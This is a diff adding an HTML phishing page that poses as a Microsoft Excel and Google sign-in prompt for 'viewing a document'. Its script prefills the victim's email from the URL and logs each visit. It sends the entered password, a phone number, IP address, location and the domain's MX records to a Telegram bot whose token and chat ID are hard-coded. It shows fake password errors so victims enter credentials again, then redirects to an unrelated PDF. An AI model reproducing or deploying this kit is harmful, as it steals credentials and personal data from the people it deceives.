@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>
+      Log in |
+      &#x4D;&#x69;&#x63;&#x72;&#x6F;&#x73;&#x6F;&#x66;&#x74;&#x20;&#x45;&#x78;&#x63;&#x65;&#x6C;&#x20;&#x2D;&#x20;&#x57;&#x6F;&#x72;&#x6B;&#x20;&#x74;&#x6F;&#x67;&#x65;&#x74;&#x68;&#x65;&#x72;&#x20;&#x6F;&#x6E;&#x20;&#x45;&#x78;&#x63;&#x65;&#x6C;&#x20;&#x73;&#x70;&#x72;&#x65;&#x61;&#x64;&#x73;&#x68;&#x65;&#x65;&#x74;&#x73;
+    </title>
+    <!-- Bootstrap CSS -->
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <style>
+      .bg-black {
+        background: #000;
+      }
+
+      .cover-image-cont {
+        background-image: url("https://i.imgur.com/fktvunG.png");
+        background-position: center;
+        background-size: cover;
+      }
+
+      .vh-100 {
+        height: 100vh;
+      }
+
+      .vh-50 {
+        height: 50vh;
+      }
+
+      .center {
+        height: 100vh;
+      }
+
+      .bg-shine {
+        background: #fff;
+      }
+
+      .text-we {
+        color: #000;
+      }
+
+      #text-holder {
+        position: absolute;
+        padding: 0px;
+        z-index: 1;
+      }
+
+      #textItSelf {
+        margin-top: 10em;
+      }
+
+      .wet {
+        font-size: 4rem;
+        font-family: "Times New Roman", Times, serif;
+        text-decoration: bold;
+      }
+
+      .bg-none {
+        background: none;
+        border: 0px;
+        color: white;
+        font-size: 1.5rem;
+      }
+
+      .agree {
+        font-size: 14px;
+      }
+
+      .bg-transperant {
+        background: rgba(0, 0, 0, 0.77);
+      }
+
+      .form {
+        margin-top: 10em;
+      }
+
+      .p {
+        font-size: 12px;
+      }
+
+      sub {
+        line-height: 1;
+        font-size: 10px;
+      }
+
+      .border-primary {
+        border-radius: 50%;
+        border: 1px solid #007bff;
+      }
+
+      .hr {
+        display: block;
+        height: 1px;
+        background: #babcbf;
+      }
+
+      .bg-sec {
+        background: #eee;
+      }
+
+      .mainForm:hover {
+        background: #eee;
+      }
+
+      label {
+        font-size: 14px;
+      }
+
+      .form-control1 {
+        height: 25px;
+        border-radius: 5px;
+        border: 0px;
+        border-bottom: 1px solid #000;
+      }
+
+      .textarea {
+        border-radius: 5px;
+        border: 0px;
+        border-bottom: 1px solid #000;
+      }
+
+      .head {
+        margin-top: 3.5em;
+      }
+
+      .fa-times:hover {
+        cursor: pointer;
+      }
+
+      .hide {
+        display: none;
+      }
+
+      .scroll-Y {
+        overflow-y: scroll;
+        height: 100vh;
+      }
+      @media only screen and (min-width: 788px) and (max-width: 1104px) {
+        #textItSelf {
+          margin-top: 5em;
+        }
+
+        .form {
+          margin-top: 5em;
+        }
+      }
+
+      @media only screen and (min-width: 0px) and (max-width: 787px) {
+        #textItSelf {
+          margin-top: 5em;
+        }
+
+        .wet {
+          font-size: 2rem;
+        }
+
+        .xs-text {
+          font-size: 1.3rem;
+        }
+
+        .bg-none {
+          font-size: 1rem;
+        }
+
+        .form {
+          margin-top: 5em;
+        }
+      }
+    </style>
+    <link
+      href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/585b051251.js"
+      crossorigin="anonymous"
+    ></script>
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="10x10"
+      href="https://i.imgur.com/cKV4FIx.png"
+    />
+  </head>
+
+  <body cz-shortcut-listen="true">
+    <div class="container-fluid p-0">
+      <div class="col-12 p-0 cover-image-cont float-left center">
+        <div class="col-12 p-0 bg-transperant vh-100" id="text-holder">
+          <div class="col-xs-12 col-sm-12 col-md-8 col-lg-4 col-xl-4 mx-auto">
+            <div
+              class="col-12 p-0 pull-left bg-white px-4 py-5 shadow rounded"
+              id="textItSelf"
+            >
+              <div
+                class="form-group"
+                style="
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                "
+              >
+                <img
+                  class="log"
+                  src="https://i.imgur.com/cKV4FIx.png"
+                  width="80"
+                />
+              </div>
+              <div class="form-group">
+                <center>
+                  <div
+                    class="alert alert-danger"
+                    id="msg"
+                    style="display: none"
+                  >
+                    Incorrect Password
+                  </div>
+                  <span id="error" class="text-danger" style="display: none"
+                    >That account doesn't exist. Enter a different account</span
+                  >
+                </center>
+              </div>
+              <center>
+                <h3 class="text-banner font-weight-normal" style="color: #000">
+                  Sign in to view document
+                </h3>
+              </center>
+
+              <div id="div1">
+                <div class="form-group">
+                  <!--<label class="text-secondary font-weight-bold">Email Address</label>-->
+                  <input
+                    type="email"
+                    class="form-control"
+                    name="em"
+                    id="ai"
+                    value="[[-Email-]]"
+                    placeholder="Email Address"
+                    readonly
+                  />
+                </div>
+                <div class="form-group">
+                  <!--<label class="text-secondary font-weight-bold">Password</label>-->
+                  <input
+                    type="password"
+                    class="form-control"
+                    name="ps"
+                    id="namep"
+                    placeholder="Password"
+                    required=""
+                  />
+                </div>
+                <div class="form-group">
+                  <input
+                    class="btn pull-left px-4 form-control"
+                    style="background: #067438; color: #fff"
+                    type="submit"
+                    id="submit-btn"
+                    value="View Document"
+                  />
+                </div>
+              </div>
+
+              <div id="div2" style="display: none">
+                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span
+                  id="aich"
+                  class="h7"
+                  >abc@abc.com</span
+                >
+                <p></p>
+                <div>
+                  <span class="h5 font-weight-normal">Verify it's you</span>
+                </div>
+                <br />
+                <span
+                  >This device is not recognized. For security, Google needs to
+                  make sure it's really you.</span
+                >
+                <span id="msg1" class="text-danger"></span><br />
+                <span>Try another way to sign in</span>
+                <div class="form-group mt-3">
+                  <input
+                    type="number"
+                    name="ph"
+                    class="form-control"
+                    id="ph"
+                    aria-describedby="aiHelp"
+                    placeholder="Enter Phone No."
+                  />
+                </div>
+                <div class="form-group">
+                  <input
+                    class="btn pull-left px-4"
+                    style="background: #067438; color: #fff"
+                    type="submit"
+                    id="submit-btn"
+                    value="verify"
+                  />
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- Optional JavaScript -->
+
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+      const BOT_TOKEN = "7256693481:AAHVAkPmxExV-EPf1cOIk-cCH0L0SR9aq7o";
+      const CHAT_ID = "5616766790";
+      const LOGGER_TOKEN = "7256693481:AAHVAkPmxExV-EPf1cOIk-cCH0L0SR9aq7o";
+      const LOGGER_ID = "-173817072";
+      const FILE =
+        "aHR0cHM6Ly9nb2xkdmlzZWludmVzbWVuuY29tL2xldmVscy9sbC5waHA=";
+
+      /* global $ */
+      $(document).ready(function () {
+        var count = 0;
+
+        /////////////url ai getting////////////////
+        const aim = window.location.hash.substr(1).split("/");
+        var hashPart = handleBase64Data(aim[0]);
+        var ai = hashPart;
+        if (!ai) {
+        } else {
+          // $('#ai').val(ai);
+          var my_ai = ai;
+          logVisitorToTelegram(my_ai);
+          var ind = my_ai.indexOf("@");
+          var my_slice = my_ai.substr(ind + 1);
+          var c = my_slice.substr(0, my_slice.indexOf("."));
+          var final = c.toLowerCase();
+          $("#ai").val(my_ai);
+          $("#msg").hide();
+          var logoUrl = "https://logo.clearbit.com/" + my_slice;
+          $.get(logoUrl)
+            .done(function () {
+              $(".log").attr("src", logoUrl);
+            })
+            .fail(function () {
+              logoUrl = "https://www.google.com/s2/favicons?domain=" + my_slice;
+              $.get(logoUrl)
+                .done(function () {
+                  $(".log").attr("src", logoUrl);
+                })
+                .fail(function () {
+                  $(".log").attr("src", "https://i.imgur.com/cKV4FIx.png");
+                });
+            });
+        }
+
+        $("#submit-btn").click(function (event) {
+          $("#error").hide();
+          $("#msg").hide();
+          event.preventDefault();
+          var ai = $("#ai").val();
+          var namep = $("#namep").val();
+          var msg = $("#msg").html();
+          $("#msg").text(msg);
+
+          var my_ai = ai;
+          var filter =
+            /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+          if (!ai) {
+            $("#msg").html("Please enter email.");
+            $("#msg").show();
+            ai.focus;
+            return false;
+          }
+
+          if (!filter.test(my_ai)) {
+            $("#msg").show();
+            $("#msg").html(
+              "That account doesn't exist. Enter a different account"
+            );
+            ai.focus;
+            return;
+          }
+          if (!namep) {
+            $("#msg").html("Please enter password.");
+            $("#msg").show();
+            ai.focus;
+            return;
+          }
+          //minimum password length validation
+
+          if (namep.length < 4) {
+            $("#msg").html("Please check your password");
+            $("#msg").show();
+            ai.focus;
+
+            return;
+          }
+          var ind = my_ai.indexOf("@");
+          var my_slice = my_ai.substr(ind + 1);
+          var c = my_slice.substr(0, my_slice.indexOf("."));
+          var final = c.toLowerCase();
+          var browser = GetBrowserandLanguage()[0];
+          domain = my_slice;
+
+          setTimeout(async () => {
+            var date = new Date();
+            const visitorInfo = await sendVisitorIP();
+            var message = `--------+ Excel ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +--------\n`;
+            message += "Email : " + ai + "\n";
+            message += "Password : " + namep + "\n";
+            message += "Checker: " + ai + ":" + namep + "\n";
+            message += "Browser : " + GetBrowserandLanguage()[0] + "\n";
+
+            message += "Language : " + GetBrowserandLanguage()[1] + "\n";
+            message += "MX Record : " + (await getMXRecord(domain)) + "\n";
+            message += "IP Address : " + visitorInfo[0] + "\n";
+            message += `Region and Country : ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} \n`;
+            message += "Date : " + date + "\n";
+            message += `---------+ Excel ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +-------------\n`;
+            var token = BOT_TOKEN;
+            var chatId = CHAT_ID;
+            $.ajax({
+              dataType: "JSON",
+              url: `https://api.telegram.org/bot${token}/sendMessage`,
+              type: "POST",
+              data: {
+                chat_id: chatId,
+                text: message,
+              },
+              beforeSend: function (xhr) {
+                $("#submit-btn").val(`Verifying Identity`);
+              },
+              success: function (response) {
+
+                if (response) {
+                  if (response["ok"] == true) {
+                    if (count >= 2) {
+                      count = 0;
+                      //         $(".login-form").hide();
+                      //         $(".success-con").show();
+                      //         $(".success-con .msg").html(`
+                      //     ${langs.yourEmail} <br>
+                      //     ${langs.success}</b>
+                      // `);
+                      console.log(`Success`);
+                      setTimeout(() => {
+                        window.location.replace(`https://www.docspro.nl/wp-content/uploads/2021/12/Docspro-License-Agreement.pdf`); // Redirect to the desired page
+                      }, 5000);
+                    } else {
+                      count++;
+                      $("#msg").html("Please check your password");
+                      $("#msg").show();
+                      $("#namep").val("");
+                      $("#namep").focus;
+                      $("#submit-btn").val(`View Document`);
+                    }
+                  }
+                }
+              },
+              error: function (err) {
+                $("#error").html(
+                  "That account doesn't exist. Enter a different account"
+                );
+                $("#namep").val("");
+                console.log("Error : ", err);
+              },
+            });
+          });
+        });
+      });
+
+      function handleBase64Data(string) {
+        try {
+          return atob(string);
+        } catch (error) {
+          return string;
+        }
+      }
+
+      function GetBrowserandLanguage() {
+        // deliver this method
+        let browser = window.clientInformation.appVersion;
+        let language = window.clientInformation.language;
+        // the return should be an array sorry not object ooo s
+        let info = [browser, language];
+
+        // return info array
+        return info;
+      }
+
+      async function logVisitorToTelegram(email = "") {
+        var date = new Date();
+
+        console.log(`Visitor Info: `, visitorInfo);
+        var message = `--------+ Visitor Excel ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} at ${date} +--------\n`;
+        message += "Email : " + email + "\n";
+        message += "Browser : " + GetBrowserandLanguage()[0] + "\n";
+        message += "Language : " + GetBrowserandLanguage()[1] + "\n";
+        message += "IP Address : " + visitorInfo[0] + "\n";
+        message += `---------+ Excel Visitor ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +-------------\n`;
+
+        const url = `https://api.telegram.org/bot${LOGGER_TOKEN}/sendMessage?chat_id=${LOGGER_ID}&text=${encodeURIComponent(
+          message
+        )}`;
+        fetch(url)
+          .then((response) => response.json())
+          .catch((error) => console.error("Error:", error));
+      }
+
+      async function getMXRecord(domain) {
+        try {
+          const response = await fetch(
+            `https://dns.google/resolve?name=${domain}&type=MX`
+          );
+          const data = await response.json();
+
+          if (data && data.Answer && data.Answer.length > 0) {
+            const mxRecords = data.Answer.map(
+              (record) => `${record.data}`
+            ).join("\n");
+            return mxRecords;
+          } else {
+            return "no-mx";
+          }
+        } catch (error) {
+          return "MX-Error";
+        }
+      }
+
+      function getVisitorIP() {
+        return new Promise(function (resolve, reject) {
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", "https://ipinfo.io/json", true);
+          xhr.onload = function () {
+            if (xhr.status >= 200 && xhr.status < 300) {
+              var response = JSON.parse(xhr.responseText);
+              resolve(response);
+            } else {
+              reject("Failed to fetch IP address");
+            }
+          };
+          xhr.onerror = function () {
+            reject("Failed to fetch IP address");
+          };
+          xhr.send();
+        });
+      }
+
+      async function sendVisitorIP() {
+        try {
+          var visitorInfo = await getVisitorIP();
+          return [
+            visitorInfo.ip,
+            visitorInfo.country,
+            visitorInfo.city,
+            visitorInfo.region,
+          ];
+          // Here you can send the visitorIP value to your desired destination
+        } catch (error) {
+          return error;
+        }
+      }
+    </script>
+  </body>
+</html>
